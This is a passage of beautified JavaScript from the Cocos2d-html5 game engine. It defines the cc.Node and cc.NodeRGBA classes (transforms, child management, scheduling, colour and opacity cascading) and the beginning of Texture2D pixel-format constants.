    cc.defineGetterSetter(t, "cascadeColor", t.isCascadeColorEnabled, t.setCascadeColorEnabled)
},
cc.NODE_TAG_INVALID = -1, cc.s_globalOrderOfArrival = 1, cc.Node = cc.Class.extend({
    _localZOrder: 0,
    _globalZOrder: 0,
    _vertexZ: 0,
    _rotationX: 0,
    _rotationY: 0,
    _scaleX: 1,
    _scaleY: 1,
    _position: null,
    _skewX: 0,
    _skewY: 0,
    _children: null,
    _visible: !0,
    _anchorPoint: null,
    _anchorPointInPoints: null,
    _contentSize: null,
    _running: !1,
    _parent: null,
    _ignoreAnchorPointForPosition: !1,
    tag: cc.NODE_TAG_INVALID,
    userData: null,
    userObject: null,
    _transformDirty: !0,
    _inverseDirty: !0,
    _cacheDirty: !0,
    _cachedParent: null,
    _transformGLDirty: null,
    _transform: null,
    _inverse: null,
    _reorderChildDirty: !1,
    _shaderProgram: null,
    arrivalOrder: 0,
    _actionManager: null,
    _scheduler: null,
    _eventDispatcher: null,
    _initializedNode: !1,
    _additionalTransformDirty: !1,
    _additionalTransform: null,
    _componentContainer: null,
    _isTransitionFinished: !1,
    _rotationRadiansX: 0,
    _rotationRadiansY: 0,
    _className: "Node",
    _showNode: !1,
    _name: "",
    _initNode: function() {
        this._anchorPoint = cc.p(0, 0),
        this._anchorPointInPoints = cc.p(0, 0),
        this._contentSize = cc.size(0, 0),
        this._position = cc.p(0, 0),
        this._children = [],
        this._transform = {
            a: 1,
            b: 0,
            c: 0,
            d: 1,
            tx: 0,
            ty: 0
        };
        var t = cc.director;
        this._actionManager = t.getActionManager(),
        this._scheduler = t.getScheduler(),
        this._initializedNode = !0,
        this._additionalTransform = cc.AffineTransformMakeIdentity(),
        cc.ComponentContainer && (this._componentContainer = new cc.ComponentContainer(this))
    },
    init: function() {
        return ! 1 === this._initializedNode && this._initNode(),
        !0
    },
    _arrayMakeObjectsPerformSelector: function(t, e) {
        if (t && 0 !== t.length) {
            var i, n, r = t.length;
            switch (i = cc.Node.StateCallbackType, e) {
            case i.onEnter:
                for (i = 0; r > i; i++)(n = t[i]) && n.onEnter();
                break;
            case i.onExit:
                for (i = 0; r > i; i++)(n = t[i]) && n.onExit();
                break;
            case i.onEnterTransitionDidFinish:
                for (i = 0; r > i; i++)(n = t[i]) && n.onEnterTransitionDidFinish();
                break;
            case i.cleanup:
                for (i = 0; r > i; i++)(n = t[i]) && n.cleanup();
                break;
            case i.updateTransform:
                for (i = 0; r > i; i++)(n = t[i]) && n.updateTransform();
                break;
            case i.onExitTransitionDidStart:
                for (i = 0; r > i; i++)(n = t[i]) && n.onExitTransitionDidStart();
                break;
            case i.sortAllChildren:
                for (i = 0; r > i; i++)(n = t[i]) && n.sortAllChildren();
                break;
            default:
                cc.assert(0, cc._LogInfos.Node__arrayMakeObjectsPerformSelector)
            }
        }
    },
    setNodeDirty: null,
    attr: function(t) {
        for (var e in t) this[e] = t[e]
    },
    getSkewX: function() {
        return this._skewX
    },
    setSkewX: function(t) {
        this._skewX = t,
        this.setNodeDirty()
    },
    getSkewY: function() {
        return this._skewY
    },
    setSkewY: function(t) {
        this._skewY = t,
        this.setNodeDirty()
    },
    setLocalZOrder: function(t) {
        this._localZOrder = t,
        this._parent && this._parent.reorderChild(this, t),
        cc.eventManager._setDirtyForNode(this)
    },
    _setLocalZOrder: function(t) {
        this._localZOrder = t
    },
    getLocalZOrder: function() {
        return this._localZOrder
    },
    getZOrder: function() {
        return cc.log(cc._LogInfos.Node_getZOrder),
        this.getLocalZOrder()
    },
    setZOrder: function(t) {
        cc.log(cc._LogInfos.Node_setZOrder),
        this.setLocalZOrder(t)
    },
    setGlobalZOrder: function(t) {
        this._globalZOrder != t && (this._globalZOrder = t, cc.eventManager._setDirtyForNode(this))
    },
    getGlobalZOrder: function() {
        return this._globalZOrder
    },
    getVertexZ: function() {
        return this._vertexZ
    },
    setVertexZ: function(t) {
        this._vertexZ = t
    },
    getRotation: function() {
        return this._rotationX !== this._rotationY && cc.log(cc._LogInfos.Node_getRotation),
        this._rotationX
    },
    setRotation: function(t) {
        this._rotationX = this._rotationY = t,
        this._rotationRadiansX = .017453292519943295 * this._rotationX,
        this._rotationRadiansY = .017453292519943295 * this._rotationY,
        this.setNodeDirty()
    },
    getRotationX: function() {
        return this._rotationX
    },
    setRotationX: function(t) {
        this._rotationX = t,
        this._rotationRadiansX = .017453292519943295 * this._rotationX,
        this.setNodeDirty()
    },
    getRotationY: function() {
        return this._rotationY
    },
    setRotationY: function(t) {
        this._rotationY = t,
        this._rotationRadiansY = .017453292519943295 * this._rotationY,
        this.setNodeDirty()
    },
    getScale: function() {
        return this._scaleX !== this._scaleY && cc.log(cc._LogInfos.Node_getScale),
        this._scaleX
    },
    setScale: function(t, e) {
        this._scaleX = t,
        this._scaleY = e || 0 === e ? e: t,
        this.setNodeDirty()
    },
    getScaleX: function() {
        return this._scaleX
    },
    setScaleX: function(t) {
        this._scaleX = t,
        this.setNodeDirty()
    },
    getScaleY: function() {
        return this._scaleY
    },
    setScaleY: function(t) {
        this._scaleY = t,
        this.setNodeDirty()
    },
    setPosition: function(t, e) {
        var i = this._position;
        void 0 === e ? (i.x = t.x, i.y = t.y) : (i.x = t, i.y = e),
        this.setNodeDirty()
    },
    getPosition: function() {
        return cc.p(this._position)
    },
    getPositionX: function() {
        return this._position.x
    },
    setPositionX: function(t) {
        this._position.x = t,
        this.setNodeDirty()
    },
    getPositionY: function() {
        return this._position.y
    },
    setPositionY: function(t) {
        this._position.y = t,
        this.setNodeDirty()
    },
    getChildrenCount: function() {
        return this._children.length
    },
    getChildren: function() {
        return this._children
    },
    isVisible: function() {
        return this._visible
    },
    setVisible: function(t) {
        this._visible = t,
        this.setNodeDirty()
    },
    getAnchorPoint: function() {
        return this._anchorPoint
    },
    setAnchorPoint: function(t, e) {
        var i = this._anchorPoint;
        if (void 0 === e) {
            if (t.x === i.x && t.y === i.y) return;
            i.x = t.x,
            i.y = t.y
        } else {
            if (t === i.x && e === i.y) return;
            i.x = t,
            i.y = e
        }
        var n = this._anchorPointInPoints,
        r = this._contentSize;
        n.x = r.width * i.x,
        n.y = r.height * i.y,
        this.setNodeDirty()
    },
    _getAnchor: function() {
        return this._anchorPoint
    },
    _setAnchor: function(t) {
        var e = t.x;
        t = t.y,
        this._anchorPoint.x !== e && (this._anchorPoint.x = e, this._anchorPointInPoints.x = this._contentSize.width * e),
        this._anchorPoint.y !== t && (this._anchorPoint.y = t, this._anchorPointInPoints.y = this._contentSize.height * t),
        this.setNodeDirty()
    },
    _getAnchorX: function() {
        return this._anchorPoint.x
    },
    _setAnchorX: function(t) {
        this._anchorPoint.x !== t && (this._anchorPoint.x = t, this._anchorPointInPoints.x = this._contentSize.width * t, this.setNodeDirty())
    },
    _getAnchorY: function() {
        return this._anchorPoint.y
    },
    _setAnchorY: function(t) {
        this._anchorPoint.y !== t && (this._anchorPoint.y = t, this._anchorPointInPoints.y = this._contentSize.height * t, this.setNodeDirty())
    },
    getAnchorPointInPoints: function() {
        return this._anchorPointInPoints
    },
    _getWidth: function() {
        return this._contentSize.width
    },
    _setWidth: function(t) {
        this._contentSize.width = t,
        this._anchorPointInPoints.x = t * this._anchorPoint.x,
        this.setNodeDirty()
    },
    _getHeight: function() {
        return this._contentSize.height
    },
    _setHeight: function(t) {
        this._contentSize.height = t,
        this._anchorPointInPoints.y = t * this._anchorPoint.y,
        this.setNodeDirty()
    },
    getContentSize: function() {
        return this._contentSize
    },
    setContentSize: function(t, e) {
        var i = this._contentSize;
        if (void 0 === e) {
            if (t.width === i.width && t.height === i.height) return;
            i.width = t.width,
            i.height = t.height
        } else {
            if (t === i.width && e === i.height) return;
            i.width = t,
            i.height = e
        }
        var n = this._anchorPointInPoints,
        r = this._anchorPoint;
        n.x = i.width * r.x,
        n.y = i.height * r.y,
        this.setNodeDirty()
    },
    isRunning: function() {
        return this._running
    },
    getParent: function() {
        return this._parent
    },
    setParent: function(t) {
        this._parent = t
    },
    isIgnoreAnchorPointForPosition: function() {
        return this._ignoreAnchorPointForPosition
    },
    ignoreAnchorPointForPosition: function(t) {
        t != this._ignoreAnchorPointForPosition && (this._ignoreAnchorPointForPosition = t, this.setNodeDirty())
    },
    getTag: function() {
        return this.tag
    },
    setTag: function(t) {
        this.tag = t
    },
    setName: function() {
        this._name
    },
    getName: function() {
        return this._name
    },
    getUserData: function() {
        return this.userData
    },
    setUserData: function(t) {
        this.userData = t
    },
    getUserObject: function() {
        return this.userObject
    },
    setUserObject: function(t) {
        this.userObject != t && (this.userObject = t)
    },
    getOrderOfArrival: function() {
        return this.arrivalOrder
    },
    setOrderOfArrival: function(t) {
        this.arrivalOrder = t
    },
    getActionManager: function() {
        return this._actionManager || (this._actionManager = cc.director.getActionManager()),
        this._actionManager
    },
    setActionManager: function(t) {
        this._actionManager != t && (this.stopAllActions(), this._actionManager = t)
    },
    getScheduler: function() {
        return this._scheduler || (this._scheduler = cc.director.getScheduler()),
        this._scheduler
    },
    setScheduler: function(t) {
        this._scheduler != t && (this.unscheduleAllCallbacks(), this._scheduler = t)
    },
    getBoundingBox: function() {
        var t = cc.rect(0, 0, this._contentSize.width, this._contentSize.height);
        return cc._RectApplyAffineTransformIn(t, this.nodeToParentTransform())
    },
    cleanup: function() {
        this.stopAllActions(),
        this.unscheduleAllCallbacks(),
        cc.eventManager.removeListeners(this),
        this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.cleanup)
    },
    getChildByTag: function(t) {
        var e = this._children;
        if (null != e) for (var i = 0; i < e.length; i++) {
            var n = e[i];
            if (n && n.tag == t) return n
        }
        return null
    },
    getChildByName: function(t) {
        if (!t) return cc.log("Invalid name"),
        null;
        for (var e = this._children,
        i = 0,
        n = e.length; n > i; i++) if (e[i]._name == t) return e[i];
        return null
    },
    addChild: function(t, e, i) {
        cc.assert(t, cc._LogInfos.Node_addChild_3),
        t === this ? cc.log(cc._LogInfos.Node_addChild) : null !== t._parent ? cc.log(cc._LogInfos.Node_addChild_2) : (e = null != e ? e: t._localZOrder, t.tag = null != i ? i: t.tag, this._insertChild(t, e), t._parent = this, this._cachedParent && (t._cachedParent = this._cachedParent), this._running && (t.onEnter(), this._isTransitionFinished) && t.onEnterTransitionDidFinish())
    },
    removeFromParent: function(t) {
        this._parent && (null == t && (t = !0), this._parent.removeChild(this, t))
    },
    removeFromParentAndCleanup: function(t) {
        cc.log(cc._LogInfos.Node_removeFromParentAndCleanup),
        this.removeFromParent(t)
    },
    removeChild: function(t, e) {
        0 !== this._children.length && (null == e && (e = !0), -1 < this._children.indexOf(t) && this._detachChild(t, e), this.setNodeDirty())
    },
    removeChildByTag: function(t, e) {
        t === cc.NODE_TAG_INVALID && cc.log(cc._LogInfos.Node_removeChildByTag);
        var i = this.getChildByTag(t);
        null == i ? cc.log(cc._LogInfos.Node_removeChildByTag_2, t) : this.removeChild(i, e)
    },
    removeAllChildrenWithCleanup: function(t) {
        cc.log(cc._LogInfos.Node_removeAllChildrenWithCleanup),
        this.removeAllChildren(t)
    },
    removeAllChildren: function(t) {
        var e = this._children;
        if (null != e) {
            null == t && (t = !0);
            for (var i = 0; i < e.length; i++) {
                var n = e[i];
                n && (this._running && (n.onExitTransitionDidStart(), n.onExit()), t && n.cleanup(), n.parent = null)
            }
            this._children.length = 0
        }
    },
    _detachChild: function(t, e) {
        this._running && (t.onExitTransitionDidStart(), t.onExit()),
        e && t.cleanup(),
        t.parent = null,
        cc.arrayRemoveObject(this._children, t)
    },
    _insertChild: function(t, e) {
        this._reorderChildDirty = !0,
        this._children.push(t),
        t._setLocalZOrder(e)
    },
    reorderChild: function(t, e) {
        cc.assert(t, cc._LogInfos.Node_reorderChild),
        this._reorderChildDirty = !0,
        t.arrivalOrder = cc.s_globalOrderOfArrival,
        cc.s_globalOrderOfArrival++,
        t._setLocalZOrder(e),
        this.setNodeDirty()
    },
    sortAllChildren: function() {
        if (this._reorderChildDirty) {
            var t, e, i, n = this._children,
            r = n.length;
            for (t = 1; r > t; t++) {
                for (i = n[t], e = t - 1; e >= 0;) {
                    if (i._localZOrder < n[e]._localZOrder) n[e + 1] = n[e];
                    else {
                        if (! (i._localZOrder === n[e]._localZOrder && i.arrivalOrder < n[e].arrivalOrder)) break;
                        n[e + 1] = n[e]
                    }
                    e--
                }
                n[e + 1] = i
            }
            this._reorderChildDirty = !1
        }
    },
    draw: function() {},
    transformAncestors: function() {
        null != this._parent && (this._parent.transformAncestors(), this._parent.transform())
    },
    onEnter: function() {
        this._isTransitionFinished = !1,
        this._running = !0,
        this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onEnter),
        this.resume()
    },
    onEnterTransitionDidFinish: function() {
        this._isTransitionFinished = !0,
        this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onEnterTransitionDidFinish)
    },
    onExitTransitionDidStart: function() {
        this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onExitTransitionDidStart)
    },
    onExit: function() {
        this._running = !1,
        this.pause(),
        this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.onExit),
        this._componentContainer && this._componentContainer.removeAll()
    },
    runAction: function(t) {
        return cc.assert(t, cc._LogInfos.Node_runAction),
        this.actionManager.addAction(t, this, !this._running),
        t
    },
    stopAllActions: function() {
        this.actionManager && this.actionManager.removeAllActionsFromTarget(this)
    },
    stopAction: function(t) {
        this.actionManager.removeAction(t)
    },
    stopActionByTag: function(t) {
        t === cc.ACTION_TAG_INVALID ? cc.log(cc._LogInfos.Node_stopActionByTag) : this.actionManager.removeActionByTag(t, this)
    },
    getActionByTag: function(t) {
        return t === cc.ACTION_TAG_INVALID ? (cc.log(cc._LogInfos.Node_getActionByTag), null) : this.actionManager.getActionByTag(t, this)
    },
    getNumberOfRunningActions: function() {
        return this.actionManager.numberOfRunningActionsInTarget(this)
    },
    scheduleUpdate: function() {
        this.scheduleUpdateWithPriority(0)
    },
    scheduleUpdateWithPriority: function(t) {
        this.scheduler.scheduleUpdateForTarget(this, t, !this._running)
    },
    unscheduleUpdate: function() {
        this.scheduler.unscheduleUpdateForTarget(this)
    },
    schedule: function(t, e, i, n) {
        e = e || 0,
        cc.assert(t, cc._LogInfos.Node_schedule),
        cc.assert(e >= 0, cc._LogInfos.Node_schedule_2),
        i = null == i ? cc.REPEAT_FOREVER: i,
        this.scheduler.scheduleCallbackForTarget(this, t, e, i, n || 0, !this._running)
    },
    scheduleOnce: function(t, e) {
        this.schedule(t, 0, 0, e)
    },
    unschedule: function(t) {
        t && this.scheduler.unscheduleCallbackForTarget(this, t)
    },
    unscheduleAllCallbacks: function() {
        this.scheduler.unscheduleAllCallbacksForTarget(this)
    },
    resumeSchedulerAndActions: function() {
        cc.log(cc._LogInfos.Node_resumeSchedulerAndActions),
        this.resume()
    },
    resume: function() {
        this.scheduler.resumeTarget(this),
        this.actionManager && this.actionManager.resumeTarget(this),
        cc.eventManager.resumeTarget(this)
    },
    pauseSchedulerAndActions: function() {
        cc.log(cc._LogInfos.Node_pauseSchedulerAndActions),
        this.pause()
    },
    pause: function() {
        this.scheduler.pauseTarget(this),
        this.actionManager && this.actionManager.pauseTarget(this),
        cc.eventManager.pauseTarget(this)
    },
    setAdditionalTransform: function(t) {
        this._additionalTransform = t,
        this._additionalTransformDirty = this._transformDirty = !0
    },
    parentToNodeTransform: function() {
        return this._inverseDirty && (this._inverse = cc.AffineTransformInvert(this.nodeToParentTransform()), this._inverseDirty = !1),
        this._inverse
    },
    nodeToWorldTransform: function() {
        for (var t = this.nodeToParentTransform(), e = this._parent; null != e; e = e.parent) t = cc.AffineTransformConcat(t, e.nodeToParentTransform());
        return t
    },
    worldToNodeTransform: function() {
        return cc.AffineTransformInvert(this.nodeToWorldTransform())
    },
    convertToNodeSpace: function(t) {
        return cc.PointApplyAffineTransform(t, this.worldToNodeTransform())
    },
    convertToWorldSpace: function(t) {
        return t = t || cc.p(0, 0),
        cc.PointApplyAffineTransform(t, this.nodeToWorldTransform())
    },
    convertToNodeSpaceAR: function(t) {
        return cc.pSub(this.convertToNodeSpace(t), this._anchorPointInPoints)
    },
    convertToWorldSpaceAR: function(t) {
        return t = t || cc.p(0, 0),
        t = cc.pAdd(t, this._anchorPointInPoints),
        this.convertToWorldSpace(t)
    },
    _convertToWindowSpace: function(t) {
        return t = this.convertToWorldSpace(t),
        cc.director.convertToUI(t)
    },
    convertTouchToNodeSpace: function(t) {
        return t = t.getLocation(),
        this.convertToNodeSpace(t)
    },
    convertTouchToNodeSpaceAR: function(t) {
        return t = t.getLocation(),
        t = cc.director.convertToGL(t),
        this.convertToNodeSpaceAR(t)
    },
    update: function(t) {
        this._componentContainer && !this._componentContainer.isEmpty() && this._componentContainer.visit(t)
    },
    updateTransform: function() {
        this._arrayMakeObjectsPerformSelector(this._children, cc.Node.StateCallbackType.updateTransform)
    },
    retain: function() {},
    release: function() {},
    getComponent: function(t) {
        return this._componentContainer.getComponent(t)
    },
    addComponent: function(t) {
        this._componentContainer.add(t)
    },
    removeComponent: function(t) {
        return this._componentContainer.remove(t)
    },
    removeAllComponents: function() {
        this._componentContainer.removeAll()
    },
    grid: null,
    ctor: null,
    visit: null,
    transform: null,
    nodeToParentTransform: null,
    _setNodeDirtyForCache: function() {
        if (!1 === this._cacheDirty) {
            this._cacheDirty = !0;
            var t = this._cachedParent;
            t && t != this && t._setNodeDirtyForCache()
        }
    },
    _setCachedParent: function(t) {
        if (this._cachedParent != t) {
            this._cachedParent = t;
            for (var e = this._children,
            i = 0,
            n = e.length; n > i; i++) e[i]._setCachedParent(t)
        }
    },
    getCamera: function() {
        return this._camera || (this._camera = new cc.Camera),
        this._camera
    },
    getGrid: function() {
        return this.grid
    },
    setGrid: function(t) {
        this.grid = t
    },
    getShaderProgram: function() {
        return this._shaderProgram
    },
    setShaderProgram: function(t) {
        this._shaderProgram = t
    },
    getGLServerState: function() {
        return this._glServerState
    },
    setGLServerState: function(t) {
        this._glServerState = t
    },
    getBoundingBoxToWorld: function() {
        var t = cc.rect(0, 0, this._contentSize.width, this._contentSize.height),
        e = this.nodeToWorldTransform(),
        t = cc.RectApplyAffineTransform(t, this.nodeToWorldTransform());
        if (!this._children) return t;
        for (var i = this._children,
        n = 0; n < i.length; n++) {
            var r = i[n];
            r && r._visible && (r = r._getBoundingBoxToCurrentNode(e)) && (t = cc.rectUnion(t, r))
        }
        return t
    },
    _getBoundingBoxToCurrentNode: function(t) {
        var e = cc.rect(0, 0, this._contentSize.width, this._contentSize.height);
        if (t = null == t ? this.nodeToParentTransform() : cc.AffineTransformConcat(this.nodeToParentTransform(), t), e = cc.RectApplyAffineTransform(e, t), !this._children) return e;
        for (var i = this._children,
        n = 0; n < i.length; n++) {
            var r = i[n];
            r && r._visible && (r = r._getBoundingBoxToCurrentNode(t)) && (e = cc.rectUnion(e, r))
        }
        return e
    },
    _nodeToParentTransformForWebGL: function() {
        if (this._transformDirty) {
            var t = this._position.x,
            e = this._position.y,
            i = this._anchorPointInPoints.x,
            n = -i,
            r = this._anchorPointInPoints.y,
            c = -r,
            o = this._scaleX,
            s = this._scaleY;
            this._ignoreAnchorPointForPosition && (t += i, e += r);
            var a = 1,
            h = 0,
            l = 1,
            u = 0; (0 !== this._rotationX || 0 !== this._rotationY) && (a = Math.cos( - this._rotationRadiansX), h = Math.sin( - this._rotationRadiansX), l = Math.cos( - this._rotationRadiansY), u = Math.sin( - this._rotationRadiansY));
            var _ = this._skewX || this._skewY;
            _ || 0 === i && 0 === r || (t += l * n * o + -h * c * s, e += u * n * o + a * c * s);
            var d = this._transform;
            d.a = l * o,
            d.b = u * o,
            d.c = -h * s,
            d.d = a * s,
            d.tx = t,
            d.ty = e,
            _ && (d = cc.AffineTransformConcat({
                a: 1,
                b: Math.tan(cc.degreesToRadians(this._skewY)),
                c: Math.tan(cc.degreesToRadians(this._skewX)),
                d: 1,
                tx: 0,
                ty: 0
            },
            d), 0 !== i || 0 !== r) && (d = cc.AffineTransformTranslate(d, n, c)),
            this._additionalTransformDirty && (d = cc.AffineTransformConcat(d, this._additionalTransform), this._additionalTransformDirty = !1),
            this._transform = d,
            this._transformDirty = !1
        }
        return this._transform
    }
}), cc.Node.create = function() {
    return new cc.Node
},
cc.Node.StateCallbackType = {
    onEnter: 1,
    onExit: 2,
    cleanup: 3,
    onEnterTransitionDidFinish: 4,
    updateTransform: 5,
    onExitTransitionDidStart: 6,
    sortAllChildren: 7
},
cc._renderType === cc._RENDER_TYPE_CANVAS) {
    var _p = cc.Node.prototype;
    _p.ctor = function() {
        this._initNode()
    },
    _p.setNodeDirty = function() {
        this._setNodeDirtyForCache(),
        !1 === this._transformDirty && (this._transformDirty = this._inverseDirty = !0)
    },
    _p.visit = function(t) {
        if (this._visible) {
            t = t || cc._renderContext;
            var e, i, n = this._children;
            t.save(),
            this.transform(t);
            var r = n.length;
            if (r > 0) {
                for (this.sortAllChildren(), e = 0; r > e && (i = n[e], 0 > i._localZOrder); e++) i.visit(t);
                for (this.draw(t); r > e; e++) n[e].visit(t)
            } else this.draw(t);
            this._cacheDirty = !1,
            this.arrivalOrder = 0,
            t.restore()
        }
    },
    _p.transform = function(t) {
        t = t || cc._renderContext;
        var e = cc.view,
        i = this.nodeToParentTransform();
        t.transform(i.a, i.c, i.b, i.d, i.tx * e.getScaleX(), -i.ty * e.getScaleY())
    },
    _p.nodeToParentTransform = function() {
        if (this._transformDirty) {
            var t = this._transform;
            t.tx = this._position.x,
            t.ty = this._position.y;
            var e = 1,
            i = 0;
            this._rotationX && (e = Math.cos(this._rotationRadiansX), i = Math.sin(this._rotationRadiansX)),
            t.a = t.d = e,
            t.b = -i,
            t.c = i;
            var n = this._scaleX,
            r = this._scaleY,
            c = this._anchorPointInPoints.x,
            o = this._anchorPointInPoints.y,
            s = 1e-6 > n && n > -1e-6 ? 1e-6: n,
            a = 1e-6 > r && r > -1e-6 ? 1e-6: r;
            if (this._skewX || this._skewY) {
                var h = Math.tan( - this._skewX * Math.PI / 180),
                l = Math.tan( - this._skewY * Math.PI / 180);
                1 / 0 === h && (h = 99999999),
                1 / 0 === l && (l = 99999999);
                var u = o * h * s,
                _ = c * l * a;
                t.a = e + -i * l,
                t.b = e * h + -i,
                t.c = i + e * l,
                t.d = i * h + e,
                t.tx += e * u + -i * _,
                t.ty += i * u + e * _
            } (1 !== n || 1 !== r) && (t.a *= s, t.c *= s, t.b *= a, t.d *= a),
            t.tx += e * -c * s + -i * o * a,
            t.ty -= i * -c * s + e * o * a,
            this._ignoreAnchorPointForPosition && (t.tx += c, t.ty += o),
            this._additionalTransformDirty && (this._transform = cc.AffineTransformConcat(t, this._additionalTransform), this._additionalTransformDirty = !1),
            this._transformDirty = !1
        }
        return this._transform
    },
    _p = null
} else cc.assert("function" == typeof cc._tmp.WebGLCCNode, cc._LogInfos.MissingFile, "BaseNodesWebGL.js"),
cc._tmp.WebGLCCNode(),
delete cc._tmp.WebGLCCNode;
if (cc.assert("function" == typeof cc._tmp.PrototypeCCNode, cc._LogInfos.MissingFile, "BaseNodesPropertyDefine.js"), cc._tmp.PrototypeCCNode(), delete cc._tmp.PrototypeCCNode, cc.NodeRGBA = cc.Node.extend({
    RGBAProtocol: !0,
    _displayedOpacity: 255,
    _realOpacity: 255,
    _displayedColor: null,
    _realColor: null,
    _cascadeColorEnabled: !1,
    _cascadeOpacityEnabled: !1,
    ctor: function() {
        cc.Node.prototype.ctor.call(this),
        this._realOpacity = this._displayedOpacity = 255,
        this._displayedColor = cc.color(255, 255, 255, 255),
        this._realColor = cc.color(255, 255, 255, 255),
        this._cascadeOpacityEnabled = this._cascadeColorEnabled = !1
    },
    _updateColor: function() {},
    getOpacity: function() {
        return this._realOpacity
    },
    getDisplayedOpacity: function() {
        return this._displayedOpacity
    },
    setOpacity: function(t) {
        this._displayedOpacity = this._realOpacity = t;
        var e = 255,
        i = this._parent;
        i && i.RGBAProtocol && i.cascadeOpacity && (e = i.getDisplayedOpacity()),
        this.updateDisplayedOpacity(e),
        this._displayedColor.a = this._realColor.a = t
    },
    updateDisplayedOpacity: function(t) {
        if (this._displayedOpacity = this._realOpacity * t / 255, this._cascadeOpacityEnabled) {
            t = this._children;
            for (var e = 0; e < t.length; e++) {
                var i = t[e];
                i && i.RGBAProtocol && i.updateDisplayedOpacity(this._displayedOpacity)
            }
        }
    },
    isCascadeOpacityEnabled: function() {
        return this._cascadeOpacityEnabled
    },
    setCascadeOpacityEnabled: function(t) {
        this._cascadeOpacityEnabled !== t && ((this._cascadeOpacityEnabled = t) ? this._enableCascadeOpacity() : this._disableCascadeOpacity())
    },
    _enableCascadeOpacity: function() {
        var t = 255,
        e = this._parent;
        e && e.RGBAProtocol && e.cascadeOpacity && (t = e.getDisplayedOpacity()),
        this.updateDisplayedOpacity(t)
    },
    _disableCascadeOpacity: function() {
        this._displayedOpacity = this._realOpacity;
        for (var t = this._children,
        e = 0; e < t.length; e++) {
            var i = t[e];
            i && i.RGBAProtocol && i.updateDisplayedOpacity(255)
        }
    },
    getColor: function() {
        var t = this._realColor;
        return cc.color(t.r, t.g, t.b, t.a)
    },
    getDisplayedColor: function() {
        var t = this._displayedColor;
        return cc.color(t.r, t.g, t.b, t.a)
    },
    setColor: function(t) {
        var e = this._displayedColor,
        i = this._realColor;
        e.r = i.r = t.r,
        e.g = i.g = t.g,
        e.b = i.b = t.b,
        e = (e = this._parent) && e.RGBAProtocol && e.cascadeColor ? e.getDisplayedColor() : cc.color.WHITE,
        this.updateDisplayedColor(e),
        void 0 !== t.a && !t.a_undefined && this.setOpacity(t.a)
    },
    updateDisplayedColor: function(t) {
        var e = this._displayedColor,
        i = this._realColor;
        if (e.r = 0 | i.r * t.r / 255, e.g = 0 | i.g * t.g / 255, e.b = 0 | i.b * t.b / 255, this._cascadeColorEnabled) for (t = this._children, i = 0; i < t.length; i++) {
            var n = t[i];
            n && n.RGBAProtocol && n.updateDisplayedColor(e)
        }
    },
    isCascadeColorEnabled: function() {
        return this._cascadeColorEnabled
    },
    setCascadeColorEnabled: function(t) {
        this._cascadeColorEnabled !== t && ((this._cascadeColorEnabled = t) ? this._enableCascadeColor() : this._disableCascadeColor())
    },
    _enableCascadeColor: function() {
        var t;
        t = (t = this._parent) && t.RGBAProtocol && t.cascadeColor ? t.getDisplayedColor() : cc.color.WHITE,
        this.updateDisplayedColor(t)
    },
    _disableCascadeColor: function() {
        var t = this._displayedColor,
        e = this._realColor;
        t.r = e.r,
        t.g = e.g,
        t.b = e.b;
        for (var t = this._children,
        e = cc.color.WHITE,
        i = 0; i < t.length; i++) {
            var n = t[i];
            n && n.RGBAProtocol && n.updateDisplayedColor(e)
        }
    },
    addChild: function(t, e, i) {
        cc.Node.prototype.addChild.call(this, t, e, i),
        this._cascadeColorEnabled && this._enableCascadeColor(),
        this._cascadeOpacityEnabled && this._enableCascadeOpacity()
    },
    setOpacityModifyRGB: function() {},
    isOpacityModifyRGB: function() {
        return ! 1
    }
}), cc.NodeRGBA.create = function() {
    var t = new cc.NodeRGBA;
    return t.init(),
    t
},
cc.assert("function" == typeof cc._tmp.PrototypeCCNodeRGBA, cc._LogInfos.MissingFile, "BaseNodesPropertyDefine.js"), cc._tmp.PrototypeCCNodeRGBA(), delete cc._tmp.PrototypeCCNodeRGBA, cc.Node.ON_ENTER = 0, cc.Node.ON_EXIT = 1, cc.Node.ON_ENTER_TRANSITION_DID_FINISH = 2, cc.Node.ON_EXIT_TRANSITOIN_DID_START = 3, cc.Node.ON_CLEAN_UP = 4, cc._tmp.PrototypeTexture2D = function() {
    var t = cc.Texture2D;
    t.PVRImagesHavePremultipliedAlpha = function(t) {
        cc.PVRHaveAlphaPremultiplied_ = t
    },
    t.PIXEL_FORMAT_RGBA8888 = 2,
    t.PIXEL_FORMAT_RGB888 = 3,
    t.PIXEL_FORMAT_RGB565 = 4,
    t.PIXEL_FORMAT_A8 = 5,
    t.PIXEL_FORMAT_I8 = 6,
    t.PIXEL_FORMAT_AI88 = 7,
    t.PIXEL_FORMAT_RGBA4444 = 8,
    t.PIXEL_FORMAT_RGB5A1 = 7,
    t.PIXEL_FORMAT_PVRTC4 = 9,
    t.PIXEL_FORMAT_PVRTC2 = 10,
    t.PIXEL_FORMAT_DEFAULT = t.PIXEL_FORMAT_RGBA8888;
    var e = cc.Texture2D._M = {};
    e[t.PIXEL_FORMAT_RGBA8888] = "RGBA8888",
    e[t.PIXEL_FORMAT_RGB888] = "RGB888",
    e[t.PIXEL_FORMAT_RGB565] = "RGB565",
    e[t.PIXEL_FORMAT_A8] = "A8",
    e[t.PIXEL_FORMAT_I8] = "I8",
    e[t.PIXEL_FORMAT_AI88] = "AI88",
    e[t.PIXEL_FORMAT_RGBA4444] = "RGBA4444",
    e[t.PIXEL_FORMAT_RGB5A1] = "RGB5A1",
    e[t.PIXEL_FORMAT_PVRTC4] = "PVRTC4",
    e[t.PIXEL_FORMAT_PVRTC2] = "PVRTC2",
    e = cc.Texture2D._B = {},
    e[t.PIXEL_FORMAT_RGBA8888] = 32,
    e[t.PIXEL_FORMAT_RGB888] = 24,
    e[t.PIXEL_FORMAT_RGB565] = 16,
    e[t.PIXEL_FORMAT_A8] = 8,
    e[t.PIXEL_FORMAT_I8] = 8,
    e[t.PIXEL_FORMAT_AI88] = 16,
    e[t.PIXEL_FORMAT_RGBA4444] = 16,
    e[t.PIXEL_FORMAT_RGB5A1] = 16,
    e[t.PIXEL_FORMAT_PVRTC4] = 4,
    e[t.PIXEL_FORMAT_PVRTC2] = 3,
    e = cc.Texture2D.prototype,
    cc.defineGetterSetter(e, "name", e.getName),
    cc.defineGetterSetter(e, "pixelFormat", e.getPixelFormat),
